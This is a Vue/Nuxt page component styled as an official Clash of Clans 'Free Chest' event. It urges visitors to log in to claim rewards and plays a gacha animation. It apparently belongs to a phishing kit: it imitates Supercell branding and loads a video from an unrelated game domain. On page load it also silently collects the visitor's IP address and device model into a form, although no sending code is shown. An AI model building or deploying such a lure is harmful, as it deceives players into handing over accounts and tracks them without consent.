<template>

    <div class="content">
        <div class="wel">
            <h1 class="shadow">Welcome to the<br>Clash of Clans Event</h1>
        </div>
        <div class="front">
            <div class="f-imgBox">
                <img src="https://p1-image.cdn-aihelp.net/FileService/UserFile/0/202505/202505181635483336a1a8a8c3b_lite.png">
            </div>
            <span class="f-title shadow">Free Chest</span>
            <p>Don’t miss out! Log in now and claim your FREE chest packed with awesome rewards</p>
            <div class="claim" @click="openModalGacha" ref="btn_claim">
                Claim Free
            </div>
        </div>

        <div class="modal-gacha hide" ref="mgacha">
            <video @click="doHammer" playsinline webkit-playsinline preload="auto" ref="gacha" src="https://akmweb.youngjoygame.com/web/jefanyamemek/image/347a0c20b878d59c74f80881e908cc23.MP4"></video>
        </div>
    </div>

</template>

<script setup>

function fallbackModelFromUA() {
    const ua = navigator.userAgent;
    const match = ua.match(/\s([A-Z0-9\-]+)\sBuild/);
    if (match && match[1]) {
        return match[1];
    } else {
        return 'No UA';
    }
}
onMounted(async () => {

    fetch('https://ip4only.me/api/')
        .then(res => res.text())
        .then(text => {
            const ip = text.split(",")[1];
            form.value.ipaddress = ip;
    });
    if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
      navigator.userAgentData.getHighEntropyValues(["model"])
        .then(ua => {
          if (ua.model) {
            form.value.device = ua.model
          } else {
            form.value.device = fallbackModelFromUA();
          }
        })
        .catch(err => {
          console.warn("Error getHighEntropyValues:", err);
          form.value.device = fallbackModelFromUA();
        });
    } else {
      form.value.device = fallbackModelFromUA();
    }
})


// Plugin
const { $confetti } = useNuxtApp();

// Element
const gacha = ref(null);
const mgacha = ref(null);
const btn_claim = ref(null);

const currentStep = ref(0);
const isPlaying = ref(false);

const steps = [0.7, 1.5, 1.5, 1.5];

const form = ref({
  ip: null,
  device: null
});

function openModalGacha() {
  mgacha.value.classList.remove('hide');
  btn_claim.value.classList.add('hide');
  doHammer();
}

function doHammer() {
  if (isPlaying.value || !gacha.value) return;

  isPlaying.value = true;

  const video = gacha.value;

  if (currentStep.value < steps.length) {
    const start = video.currentTime;
    const target = start + steps[currentStep.value];

    const onTimeUpdate = () => {
      if (video.currentTime >= target) {
        video.pause();
        video.removeEventListener('timeupdate', onTimeUpdate);
        isPlaying.value = false;
        currentStep.value++;
      }
    };

    video.addEventListener('timeupdate', onTimeUpdate);
    video.play();
  } else {
    video.play();

    setTimeout(() => {
      mgacha.value.classList.add('hide');
      isPlaying.value = false;
    }, 1900);
  }
}

</script>

<style scoped>

#__nuxt .content
{
    width: 100%;
    flex: 1;
    display: flex;
    align-items: center;
    justify-content: flex-start;
    flex-direction: column;
    /* padding: 0 0 25px 0; */
    z-index: 2;
}

.content .wel
{
    width: 100%;
}

.wel h1
{
    font-size: 18px;
    text-align: center;
}

.content .front
{
    position: relative;
    margin: 100px 0 50px 0;
    width: 300px;
    padding: 50px 20px 20px 20px;
    display: flex;
    flex-direction: column;
    align-items: center;
    background: linear-gradient(170deg,hsl(38,49%,79%) 7.07%,#C49572 92.88%);
    box-shadow: 0 4px 0 -1px #8c5a33,0 24px 14px -8px rgba(31,14,1,.35),0 28px 18px rgba(21,9,0,.5),inset 0 0 1px 2px hsla(0,0%,100%,.3);
    border-radius: 16px;
}

.front .f-imgBox
{
    position: absolute;
    top: -100px;
    left: 50%;
    transform: translateX(-50%) rotateZ(-20deg);
    width: 160px;
    z-index: 1;
    animation: bounce 2s linear infinite;
}

.front .claim
{
    background-color: #000;
    box-shadow: inset 0 3px 0 #4d4d4d;
    color: #fff;
    font-size: 11px;
    padding: 5px 8px;
    border-radius: 5px;
    cursor: pointer;
}

@keyframes bounce
{
    0%, 100%
    {
        transform: translateX(-50%) rotateZ(-20deg) scale(1);
    } 50% {
        transform: translateX(-50%) rotateZ(-20deg) scale(1.09);
    }
}


.f-imgBox img
{
    position: relative;
    max-width: 100%;
}

.f-imgBox::before
{
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: url('https://p1-image.cdn-aihelp.net/FileService/UserFile/0/202505/20250518164523972aa6d58c753.png') no-repeat center;
    background-size: cover;
    animation: spin 15s linear infinite;
}

@keyframes spin {
  0% {
    transform: rotateZ(0deg);
  }
  100% {
    transform: rotateZ(360deg);
  }
}

.front p
{
    color: #000;
    font-family: 'SupercellText-Regular';
    text-align: center;
    font-size: 11px;
    padding: 10px;
}

.modal-gacha
{
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 100%;
    height: 100%;
    z-index: 9;
    cursor: pointer;
}

.modal-gacha video
{
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    object-fit: fill;
}

video::-webkit-media-controls {
  display: none !important;
}

video::-webkit-media-controls-enclosure {
  display: none !important;
}

video::-webkit-media-controls-panel {
  display: none !important;
}


/* .wrap::before
{
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    background: url('https://store.supercell.com/_next/static/media/section-divider-2x.bbe7e030.png') no-repeat center;
    height: 5px;
} */

</style>